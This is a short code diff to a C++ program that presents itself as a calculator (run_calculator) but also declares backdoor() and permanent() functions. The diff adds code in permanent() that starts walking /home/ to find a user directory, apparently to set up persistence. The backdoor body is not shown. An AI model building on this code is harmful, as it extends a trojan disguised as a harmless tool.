@@ -5,6 +5,10 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include<unistd.h>
+#include <dirent.h>
+
+
+
 void run_calculator();
 int get_result(int &a, int &b, char &op);
 void backdoor();
@@ -46,7 +50,18 @@ void backdoor()
 
 void permanent(){
 
+    struct dirent *dir_entry;
     std::string path_start = "/home/";
+
+    DIR *dp = opendir(path_start.c_str());
+
+    readdir(dp);
+    readdir(dp);
+    dir_entry =  readdir(dp);
+
+
+
+
 
 }
 
